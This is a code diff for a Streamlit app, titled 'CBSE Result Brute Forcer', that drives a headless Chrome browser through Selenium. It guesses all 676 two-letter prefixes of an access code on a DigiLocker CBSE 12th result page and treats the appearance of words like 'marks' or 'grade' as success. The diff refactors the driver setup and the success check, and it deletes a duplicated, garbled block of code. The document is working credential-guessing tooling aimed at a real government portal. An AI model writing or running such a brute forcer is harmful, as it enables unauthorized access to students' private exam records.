@@ -5,24 +5,42 @@ from selenium.common.exceptions import NoSuchElementException
 import time
 import string
 
-# ====================== FUNCTIONS FIRST ======================
-def run_brute_force(roll_number, known_last_6, delay):
-    status = st.empty()
-    progress = st.empty()
-    result = st.empty()
-
+# ====================== HELPER FUNCTIONS ======================
+def get_driver():
     options = webdriver.ChromeOptions()
     options.add_argument("--headless=new")
     options.add_argument("--no-sandbox")
     options.add_argument("--disable-dev-shm-usage")
     options.add_argument("--disable-gpu")
     options.add_argument("--window-size=1920,1080")
+    options.add_argument("--disable-extensions")
+    return webdriver.Chrome(options=options)
+
+def is_success(driver):
+    try:
+        error = driver.find_element(By.ID, "err_msg")
+        if error.is_displayed() and error.text.strip():
+            return False
+    except NoSuchElementException:
+        pass
+    except:
+        pass
+
+    page_text = driver.page_source.lower()
+    success_keywords = ["marks", "subject", "grade", "total", "result", "passed", "percentage"]
+    return any(kw in page_text for kw in success_keywords)
+
+
+def run_brute_force(roll_number, known_last_6, delay):
+    status = st.empty()
+    progress = st.empty()
+    result = st.empty()
 
     driver = None
     try:
-        driver = webdriver.Chrome(options=options)
+        driver = get_driver()
         driver.get("https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html")
-        status.success("✅ Browser started. Searching combinations...")
+        status.success("✅ Browser started successfully. Starting search...")
 
         letters = string.ascii_uppercase
         count = 0
@@ -55,29 +73,16 @@ def run_brute_force(roll_number, known_last_6, delay):
                 except:
                     continue
 
-        st.error("❌ Not found after 676 attempts.")
+        st.error("❌ Finished all 676 attempts. Code not found.")
 
     except Exception as e:
-        st.error(f"Error: {e}")
+        st.error(f"**Browser Error:** {e}")
     finally:
         if driver:
             driver.quit()
 
 
-def is_success(driver):
-    try:
-        error = driver.find_element(By.ID, "err_msg")
-        if error.is_displayed() and error.text.strip():
-            return False
-    except NoSuchElementException:
-        pass
-
-    page_text = driver.page_source.lower()
-    success_keywords = ["marks", "subject", "grade", "total", "result", "passed", "percentage"]
-    return any(kw in page_text for kw in success_keywords)
-
-
-# ====================== MAIN STREAMLIT UI ======================
+# ====================== MAIN UI ======================
 st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
 st.title("🔍 CBSE 12th Result Brute Forcer")
 
@@ -91,28 +96,4 @@ if st.button("🚀 Start Brute Force", type="primary"):
     elif not roll_number:
         st.error("Please enter Roll Number.")
     else:
-        run_brute_force(roll_number.strip(), known_last_6.strip().upper(), delay)                        **Prefix:** `{a}{b}`
-                        """)
-                        st.balloons()
-                        return
-                except:
-                    continue
-
-        st.error("❌ Not found after 676 attempts.")
-
-    except Exception as e:
-        st.error(f"Error: {e}")
-    finally:
-        if driver:
-            driver.quit()
-
-def is_success(driver):
-    try:
-        error = driver.find_element(By.ID, "err_msg")
-        if error.is_displayed() and error.text.strip():
-            return False
-    except:
-        pass
-
-    page_text = driver.page_source.lower()
-    return any(k in page_text for k in ["marks", "subject", "grade", "total", "result", "passed"])
+        run_brute_force(roll_number.strip(), known_last_6.strip().upper(), delay)
